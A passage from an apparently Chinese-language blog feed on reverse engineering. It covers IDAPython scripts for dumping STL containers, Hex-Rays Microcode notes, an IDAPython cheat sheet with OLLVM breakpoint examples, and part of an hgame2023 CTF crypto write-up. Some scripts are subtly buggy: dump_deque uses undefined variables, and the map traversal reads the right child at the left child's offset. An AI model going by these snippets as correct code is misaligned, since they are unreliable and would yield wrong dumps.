py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dump_stl_list</span>(<span class="params">p_list_addr</span>):</span><br><span class="line">    data_addr = []</span><br><span class="line">    list_size = idc.read_dbg_qword(p_list_addr+<span class="number">0x10</span>)</span><br><span class="line">    cur_node = p_list_addr</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(list_size):</span><br><span class="line">        cur_node = idc.read_dbg_qword(cur_node + <span class="number">0x0</span>)</span><br><span class="line">        data_addr.append(cur_node + <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><h2 id="std-deque"><a href="#std-deque" class="headerlink" title="std::deque"></a>std::deque</h2><ul><li>头结构 + 迭代器结构</li><li>适用 std::deque &#x2F; std::stack</li></ul><p><img data-src="/./../images/image-20230120203905814.png" alt="image-20230120203905814"></p><ol><li>stl_deque.start.node 确定first map 项位置</li><li>stl_deque.start.last - stl_deque.start.first 确定缓冲区大小</li><li>stl_deque.finish.node 确定last map 项位置</li><li>对于每一个 map 项： <ol><li>start 项，解析 cur, last 区间</li><li>finish 项，解析 start, cur 区间</li><li>其余项，解析 start, last 区间</li></ol></li></ol><p>内存布局:<img data-src="/./../images/image-20230120203718899.png" alt="image-20230120203718899"></p><p>IDA dump 脚本:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">deque_iter = namedtuple(<span class="string">&#x27;deque_iter&#x27;</span>,[<span class="string">&#x27;cur&#x27;</span>,<span class="string">&#x27;first&#x27;</span>,<span class="string">&#x27;last&#x27;</span>,<span class="string">&#x27;node&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_iter</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="comment"># 解析队列迭代器</span></span><br><span class="line">    cur = idc.read_dbg_qword(addr + <span class="number">0x0</span>)</span><br><span class="line">    first = idc.read_dbg_qword(addr + <span class="number">0x8</span>)</span><br><span class="line">    last = idc.read_dbg_qword(addr + <span class="number">0x10</span>)</span><br><span class="line">    node = idc.read_dbg_qword(addr + <span class="number">0x18</span>)</span><br><span class="line">    <span class="keyword">return</span> deque_iter(cur,first,last,node)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_deque</span>(<span class="params">addr</span>):</span><br><span class="line">    ELEMENT_SIZE = <span class="number">4</span>    <span class="comment"># std::deque&lt;xx&gt; xx 的类型大小来指定</span></span><br><span class="line">    data_addr = []</span><br><span class="line">    start_iter = parse_iter(addr + <span class="number">0x10</span>)</span><br><span class="line">    finish_iter = parse_iter(addr + <span class="number">0x30</span>)</span><br><span class="line">    buf_size = start_iter.last - start_iter.first</span><br><span class="line">    map_size = start_iter.node</span><br><span class="line">    map_finish = finish_iter.node</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析第一个缓存数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_iter.cur,start_iter.last,ELEMENT_SIZE):</span><br><span class="line">        data_addr.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析最后一个缓存数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(finish_iter.first,finish_iter.cur,ELEMENT_SIZE):</span><br><span class="line">        data_addr.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析中间缓存数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(map_start + <span class="number">8</span>,map_finish - <span class="number">8</span>,<span class="number">8</span>):</span><br><span class="line">        buf_start = idc.read_dbg_qword(b)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(buf_start,buf_start + buf_size, ELEMENT_SIZE):</span><br><span class="line">            data_addr.append(i)</span><br><span class="line">    <span class="keyword">return</span> data_addr</span><br></pre></td></tr></table></figure><h2 id="std-map"><a href="#std-map" class="headerlink" title="std::map"></a>std::map</h2><ul><li>底层采用 Rb-Tree 实现（红黑二叉树）</li><li>头结构 + 节点结构</li><li>用二叉树遍历可提取数据</li><li>适用 std::map &#x2F; std::set &#x2F; std::multimap &#x2F; std::multiset</li></ul><p>内存分布：<img data-src="/./../images/image-20230120204147238.png" alt="image-20230120204147238"></p><p>IDA dump 脚本：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_gnu_map_header</span>(<span class="params">address</span>):</span><br><span class="line">    root = idc.read_dbg_qword(address + <span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_gnu_map_node</span>(<span class="params">address</span>):</span><br><span class="line">    left = idc.read_dbg_qword(address + <span class="number">0x10</span>)</span><br><span class="line">    right = idc.read_dbg_dword(address + <span class="number">0x10</span>)</span><br><span class="line">    data = address + <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> left, right, data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_gnu_map_travel</span>(<span class="params">address</span>):</span><br><span class="line">    <span class="comment"># address &lt;—— std::map struct address</span></span><br><span class="line">    result = []</span><br><span class="line">    worklist = [parse_gnu_map_header(address)]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(worklist) &gt; <span class="number">0</span>:</span><br><span class="line">        addr = worklist.pop()</span><br><span class="line">        (left, right, data) = parse_gnu_map_node(addr)</span><br><span class="line">        <span class="keyword">if</span> left &gt; <span class="number">0</span>: worklist.append(left)</span><br><span class="line">        <span class="keyword">if</span> right &gt; <span class="number">0</span>: worklist.append(right)</span><br><span class="line">        result.append(data)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="std-unsorted-map"><a href="#std-unsorted-map" class="headerlink" title="std::unsorted_map"></a>std::unsorted_map</h2><ul><li>底层采用 HashTable 实现</li><li>头结构 + Bucket 数组 + 节点结构</li><li><strong>所有节点结构用单链表串联（****dump</strong> <strong>只需要遍历单链表）</strong></li><li><strong>头结构的第三个字段为单链表头</strong></li><li><strong>适用</strong> **std::**<strong>unsorted_map</strong> **&#x2F; std::**<strong>unsorted_set</strong> <strong>&#x2F; …</strong></li></ul><p>内存布局:<img data-src="/./../images/image-20230120204319472.png" alt="image-20230120204319472"></p><p>IDA dump 脚本:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dump_stl_hashmap</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="comment"># dump stl hashmap gnu c++ x64</span></span><br><span class="line">    data_addr = []</span><br><span class="line">    bucket_addr = idc.read_dbg_qword(addr + <span class="number">0x10</span>)</span><br><span class="line">    node_addr = bucket_addr</span><br><span class="line">    <span class="keyword">while</span> node_addr != <span class="number">0</span>:</span><br><span class="line">        data_addr.append(node_addr + <span class="number">0x8</span>)</span><br><span class="line">        node_addr = idc.read_dbg_qword(node_addr)</span><br><span class="line">    <span class="keyword">return</span> data_addr</span><br></pre></td></tr></table></figure><h2 id="std-shared-ptr"><a href="#std-shared-ptr" class="headerlink" title="std::shared_ptr"></a>std::shared_ptr</h2><p>第一个指针就是数据指针</p><p>内存布局：<img data-src="/./../images/image-20230120204555397.png" alt="image-20230120204555397"></p><hr><h1 id="实战部分"><a href="#实战部分" class="headerlink" title="实战部分"></a>实战部分</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;c++ STL&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Microcode</title>
    <link href="https://pa1r0t.github.io/2023/01/19/Microcode/"/>
    <id>https://pa1r0t.github.io/2023/01/19/Microcode/</id>
    <published>2023-01-19T14:09:48.000Z</published>
    <updated>2023-01-21T05:43:58.826Z</updated>
    
    <content type="html"><![CDATA[<p>记录Microcode </p><span id="more"></span><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Microcode 是 hexrays 内部采用的介于机器代码与伪代码之间的一种中间表示语言(IR)。</p><p>Microcode 生成完成后，IDA 在 Microcode 的基础上生成 CTree。 CTree 是 IDA 内部用于表示 C语言伪代码的抽象语法树，IDA 也提供了大量 API 操作 CTree，可以实现一下伪代码展示方面的优化，例如删除某些节点等等。</p><p>Microcode 指令格式</p><p>opcode left, right, destination<br>一般来说有三个操作数，有一些指令可能缺少某个操作数，destination 也不一定会被修改（Store 指令）</p><p>Microcode 中常见的数据结构</p><p>函数是 IDA 中最大的汇编结果表示单位</p><p>函数 → 基本块 → 指令 → 操作数</p><p>Microcode 可视化插件</p><p><a href="https://github.com/gaasedelen/lucid">https://github.com/gaasedelen/lucid</a></p><p>Ctree 可视化插件<br><a href="https://github.com/patois/HRDevHelper">https://github.com/patois/HRDevHelper</a></p><p>Microcode生成过程：</p><ol><li><p>生成 Microcode</p></li><li><p>变换 Microcode （例如优化）</p></li><li><p>局部变量分配</p></li><li><p>生成 CTree （CTree 是 IDA 用来表示伪代码的抽象语法树 AST）</p></li><li><p>优化 CTree</p></li><li><p>输出 CTree</p></li></ol><p>Microcode 寄存器</p><p>microcode 的寄存器没有数量限制，物理寄存器往往会被直接映射到 microcode 寄存器，例如</p><ul><li>AL   is mapped into al.1 (mreg number 8)</li><li>AH  is mapped into ah.1 (mreg number 9)</li><li>EAX is mapped into eax.4 (mreg numbers 8-11)</li><li>RSI  is mapped into rsi.8</li></ul><p>Microcode 分阶段生成, 最初阶段生成的代码非常冗余</p><p><img data-src="/./../images/image-20230119221600205.png" alt="image-20230119221600205"></p><p>Microcode 快速上手，手动调用 microcode 生成</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_hexrays</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_microcode</span>(<span class="params">func_ea</span>):</span><br><span class="line">    maturity = ida_hexrays.MMAT_GLBOPT3</span><br><span class="line">    <span class="comment">#   maturity:</span></span><br><span class="line">    <span class="comment">#   MMAT_ZERO,          //&lt; microcode 不存在</span></span><br><span class="line">    <span class="comment">#   MMAT_GENERATED      //&lt; 已经生成的microcode</span></span><br><span class="line">    <span class="comment">#   MMAT_PREOPTIMIED    //&lt; 预先优化的pass已完成</span></span><br><span class="line">    <span class="comment">#   MMAT_LOCOPT         //&lt; local 本地每个基本块的优化已完成    control控制流图也就绪</span></span><br><span class="line">    <span class="comment">#   MMAT_CALLS          //&lt; 检测调用参数</span></span><br><span class="line">    <span class="comment">#   MMAT_GLBOPT1        //&lt; 执行第一个全局优化pass</span></span><br><span class="line">    <span class="comment">#   MMAT_GLBOPT2        //&lt; 大多数全局优化pass已完成</span></span><br><span class="line">    <span class="comment">#   MMAT_GLBOPT3        //&lt; 完成所有的优化，microcode被修改</span></span><br><span class="line">    <span class="comment">#   MMAT_LVAR3          //&lt; 分配所有的局部变量</span></span><br><span class="line">    hf = ida_hexrays.hexrays_failure_t()</span><br><span class="line">    pfn = idaapi.get_func(func_ea)</span><br><span class="line">    rng = ida_hexrays.mba_ranges_t(pfn)</span><br><span class="line">    mba = ida_hexrays.gen_microcode(rng,hf,<span class="literal">None</span>,</span><br><span class="line">                                    ida_hexrays.DECOMP_WARNINGS,maturity)</span><br><span class="line">    vp = ida_hexrays.vd_printer_t()</span><br><span class="line">    mba._<span class="built_in">print</span>(vp)</span><br><span class="line">print_microcode(<span class="number">0x1229</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Microcode 相关的数据结构，定义在 hexrays.hpp 文件 </p><p><img data-src="/./../images/image-20230119221901715.png" alt="image-20230119221901715"></p><p><img data-src="/./../images/image-20230119222011500.png" alt="image-20230119222011500"></p><p>Microcode 相关的数据结构: <strong>mbl_array_t</strong>,这个结构用来存放函数的基本块信息</p><ul><li>基本块之间使用双向链表链接</li><li>基本块数组存放在 natural 数组</li></ul><p><img data-src="/./../images/image-20230119222056330.png" alt="image-20230119222056330"></p><p>Microcode 相关的数据结构: mblock_t,这个结构用来描述基本块信息。±基本块内的指令与指令之间使用双向链表链接</p><p><img data-src="/./../images/image-20230119222156151.png" alt="image-20230119222156151"></p><p>Microcode 相关的数据结构: minsn_t。用于描述指令信息的结构。（注意微码指令支持指令嵌套。）</p><p><img data-src="/./../images/image-20230119222222555.png" alt="image-20230119222222555"></p><p>Microcode 相关的数据结构: mop_t</p><p>用于描述操作数信息的结构，指令 minsn_t 有 0 ~ 3 个操作数，分别时 l (left), r (right), d (destination) 操作数的类型用 mop_t 来表示</p><p><img data-src="/./../images/image-20230119222252600.png" alt="image-20230119222252600"></p><p>Microcode 插件例子</p><ul><li>实现 svc 0x900001 与 svc 0x9000F8 指令反编译成一条 call 指令</li><li>install_microcode_filter 注册 microcode filter 实现拦截指令翻译</li><li>microcode filter 是一种可以拦截 microcode 指令生成的机制，开发者需要继承 microcode_filter_t 类并实现 match 与 apply 两个函数。 </li><li>ida 在生成某一条指令的 microcode 之前会调用所有已经注册的 filter 的 match 函数，若 match 函数返回 True，则调用对应的 apply 函数实现指令替换。</li><li>我们需要将 svc 指令替换成 call 指令，ida 已经为我们实现了替换类 udc_filter_t, 这个类继承于 microcode_filter_t 并实现了 apply 方法（即替换call指令），我们需要继承 udc_filter_t 并实现它的 match 方法用于判断拦截的指令。</li></ul><p>Microcode 插件例子</p><p><img data-src="/./../images/image-20230119222437041.png" alt="image-20230119222437041"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录Microcode &lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>IDAPython</title>
    <link href="https://pa1r0t.github.io/2023/01/19/IDAPython/"/>
    <id>https://pa1r0t.github.io/2023/01/19/IDAPython/</id>
    <published>2023-01-19T09:52:02.000Z</published>
    <updated>2023-01-19T10:41:38.027Z</updated>
    
    <content type="html"><![CDATA[<p>记录ida脚本</p><span id="more"></span><h2 id="IDA-Python-脚本编程"><a href="#IDA-Python-脚本编程" class="headerlink" title="IDA Python 脚本编程"></a>IDA Python 脚本编程</h2><p>内存分为：</p><ul><li>本地内存</li><li>调试内存</li></ul><h3 id="常用脚本接口介绍"><a href="#常用脚本接口介绍" class="headerlink" title="常用脚本接口介绍"></a>常用脚本接口介绍</h3><p>寄存器操作（调试）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">idc.get_reg_value(<span class="string">&#x27;rax’)</span></span><br><span class="line"><span class="string">idaapi.set_reg_val(&quot;rax&quot;, 1234)</span></span><br></pre></td></tr></table></figure><p>读取 xmm 寄存器</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_xmm_reg</span>(<span class="params">name</span>):</span><br><span class="line">    rv = idaapi.regval_t()</span><br><span class="line">    idaapi.get_reg_val(name,rv)</span><br><span class="line">    <span class="keyword">return</span> (struct.unpack(<span class="string">&quot;Q&quot;</span>,rv.<span class="built_in">bytes</span>())[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>调试内存操作dbg 是指debug内存（调试内存）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">idc.read_dbg_byte(addr)</span><br><span class="line">idc.read_dbg_word(addr)</span><br><span class="line">idc.read_dbg_dword(addr)</span><br><span class="line">idc.read_dbg_qword(addr)</span><br><span class="line">idc.read_dbg_memory(addr,size)</span><br><span class="line">idc.patch_dbg_byte(addr,val)</span><br></pre></td></tr></table></figure><p>调试内存读写封装</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">patch_dbg_mem</span>(<span class="params">addr,data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        idc.patch_dbg_byte(addr+i,data[i])</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_dbg_mem</span>(<span class="params">addr,size</span>):</span><br><span class="line">    dd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        dd.append(idc.read_dbg_byte(addr+i))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(dd)</span><br></pre></td></tr></table></figure><p>本地内存操作（会修改idb数据库）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">idc.get_qword(addr)</span><br><span class="line">idc.patch_qword(addr,val)</span><br><span class="line">idc.patch_dword(addr,val)</span><br><span class="line">idc.patch_word(addr,val)</span><br><span class="line">idc.patch_byte(addr,val)</span><br><span class="line">idc.get_bytes(addr,size)</span><br></pre></td></tr></table></figure><p>反汇编操作</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">idc.GetDisasm(addr) <span class="comment"># 只能返回一条汇编指令</span></span><br><span class="line">idc.next_head(addr) <span class="comment"># 获取下一条汇编指令的地址</span></span><br></pre></td></tr></table></figure><p>交叉引用分析</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ref <span class="keyword">in</span> idautils.XrefsTo(ea):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ref.frm))</span><br></pre></td></tr></table></figure><p>杂项常用接口</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">idc.add_bpt(addr) <span class="comment"># 添加断点</span></span><br><span class="line">idaapi.get_imagebase() <span class="comment"># 获取基地址</span></span><br><span class="line">idc.create_insn(addr) <span class="comment"># 生成汇编指令，相当于快捷键C 常用于固件分析</span></span><br><span class="line">ida_funcs.add_func(addr) <span class="comment"># 生成函数，相当于快捷键p</span></span><br><span class="line">ida_bytes.create_strlit(addr) <span class="comment"># 生成字符串，相当于快捷键A</span></span><br></pre></td></tr></table></figure><p>函数遍历</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x,%s&quot;</span> % (func,idc.get_func_name(func)))</span><br></pre></td></tr></table></figure><p>基本块的遍历</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fn = 目标函数地址</span><br><span class="line">f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS)</span><br><span class="line"><span class="keyword">for</span> blocks <span class="keyword">in</span> f_blocks:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(blocks.start_ea))</span><br><span class="line">    <span class="comment"># 基本块的前驱</span></span><br><span class="line">    <span class="keyword">for</span> pre <span class="keyword">in</span> blocks.preds():</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(pre.start_ea))</span><br><span class="line">    <span class="comment"># 基本块的后继</span></span><br><span class="line">    <span class="keyword">for</span> sucess <span class="keyword">in</span> blocks.succs():</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(sucess.start_ea))</span><br></pre></td></tr></table></figure><p>指令遍历</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ins <span class="keyword">in</span> idautils.FuncItems(addr):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ins))</span><br></pre></td></tr></table></figure><h3 id="实战部分"><a href="#实战部分" class="headerlink" title="实战部分"></a>实战部分</h3><p>ollvm批量断点设置：</p><p>实验材料：ollvm-flat</p><p>注意：<strong>判断真实块的依据是查找</strong> <strong>ollvm</strong> <strong>汇集点基本块的交叉引用，不一定准确</strong></p><p>断点脚本：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line"><span class="comment"># ollvm函数地址</span></span><br><span class="line">fn = <span class="number">0x401F60</span></span><br><span class="line"><span class="comment"># ollvm基本块汇集地址</span></span><br><span class="line">ollvm_tail = <span class="number">0x405D4B</span></span><br><span class="line"><span class="comment"># 拿到函数基本块的迭代器</span></span><br><span class="line">f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS)</span><br><span class="line"><span class="comment"># 然后遍历函数基本块</span></span><br><span class="line"><span class="keyword">for</span> block <span class="keyword">in</span> f_blocks:</span><br><span class="line">    <span class="comment"># 拿到每个基本块的后驱</span></span><br><span class="line">    <span class="keyword">for</span> sucess <span class="keyword">in</span> block.succs():</span><br><span class="line">        <span class="keyword">if</span> sucess.start_ea == ollvm_tail:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(block.start_ea))</span><br><span class="line">            idc.add_bpt(block.start_ea)</span><br></pre></td></tr></table></figure><p>复制到ida下面，摁回车两次就行</p><p><img data-src="/./../images/image-20230119182419401.png" alt="image-20230119182419401"></p><p>成功打上断点，打上断点的基本块都是真实块</p><p><img data-src="/./../images/image-20230119182530944.png" alt="image-20230119182530944"></p><p>断点管理</p><p><img data-src="/./../images/image-20230119182636581.png" alt="image-20230119182636581"></p><p>全选右键生成文件夹</p><p><img data-src="/./../images/image-20230119182727613.png" alt="image-20230119182727613"></p><p>点击文件夹，进行断点的批量禁用或启用</p><p><img data-src="/./../images/image-20230119182906812.png" alt="image-20230119182906812"></p><p>条件断点脚本编写：</p><p>实验材料：dump_test.exe</p><p>目标：设置一个条件断点，当 rand 函数返回值为 16949 时停下</p><p>找到random函数</p><p><img data-src="/./../images/image-20230119183303757.png" alt="image-20230119183303757"></p><p>设置断点</p><p><img data-src="/./../images/image-20230119183327074.png" alt="image-20230119183327074"></p><p>在断点处右键编辑断点</p><p><img data-src="/./../images/image-20230119183413079.png" alt="image-20230119183413079"></p><p>脚本：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bp</span>():</span><br><span class="line">    rax = idc.get_reg_value(<span class="string">&#x27;rax&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> rax == <span class="number">16949</span></span><br></pre></td></tr></table></figure><p>先在ida中执行脚本</p><p>然后编辑断点，增加condition条件</p><p><img data-src="/./../images/image-20230119183620480.png" alt="image-20230119183620480"></p><p>然后运行程序</p><p>程序停下来后，就查看rax寄存器，经过16进制转10进制，结果正确</p><p><img data-src="/./../images/image-20230119183829577.png" alt="image-20230119183829577"></p><p>条件断点运用：dump rand 函数每一次执行结果，不让程序停下来</p><p>脚本：条件断点函数返回 False，IDA 不会命中该断点,利用这个特性提取运行时数据</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bp</span>():</span><br><span class="line">    rax = idc.get_reg_value(<span class="string">&#x27;rax&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(rax,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录ida脚本&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2023</title>
    <link href="https://pa1r0t.github.io/2023/01/14/hgame2023/"/>
    <id>https://pa1r0t.github.io/2023/01/14/hgame2023/</id>
    <published>2023-01-14T02:09:49.000Z</published>
    <updated>2023-02-14T02:36:57.723Z</updated>
    
    <content type="html"><![CDATA[<p>复现hgame</p><span id="more"></span><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="兔兔的车票"><a href="#兔兔的车票" class="headerlink" title="兔兔的车票"></a>兔兔的车票</h3><p>题目：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeSourceImg</span>():</span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#生成图像吧</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="comment">#写像素</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    <span class="comment"># 生成图片</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height)) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line">n1 = makeSourceImg()</span><br><span class="line">n2 = makeSourceImg()</span><br><span class="line">n3 = makeSourceImg()</span><br><span class="line">nonce = [n1, n2, n3]    <span class="comment">#三张图片</span></span><br><span class="line"></span><br><span class="line">index = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">16</span>)) <span class="comment">#生成0~16的序列</span></span><br><span class="line">shuffle(index)  <span class="comment"># 打乱序列</span></span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">    im = Image.<span class="built_in">open</span>(<span class="string">f&quot;source/picture<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">    key = nonce[randint(<span class="number">0</span>, <span class="number">2</span>)]</span><br><span class="line">    encImg = xorImg(key, im)</span><br><span class="line">    encImg.save(<span class="string">f&#x27;pics/enc<span class="subst">&#123;e&#125;</span>.png&#x27;</span>)</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>解法：原先我看着只有enc.png,其他啥都没有，怎么个异或？后来也注意到key只有三个，考虑过重复的情况，但是我发现仅有一个enc.png,还是没法搞出原图，后来看了别人的wp，才知道，只要flag.png^picture.png就行，因为它的picture.png原本的就没啥像素，enc.png大部分还是key的像素，所以找到一张存在flag.png的图片，将key异或掉就行，最终虽然得不到真正得flag.png但模糊程度也不高。这里对16张图片笛卡尔积级别异或就行</p><p>最后解密代码：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;<span class="number">0</span>&#125;</span>.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line">flagImg.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    <span class="comment"># 生成图片</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height)) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span 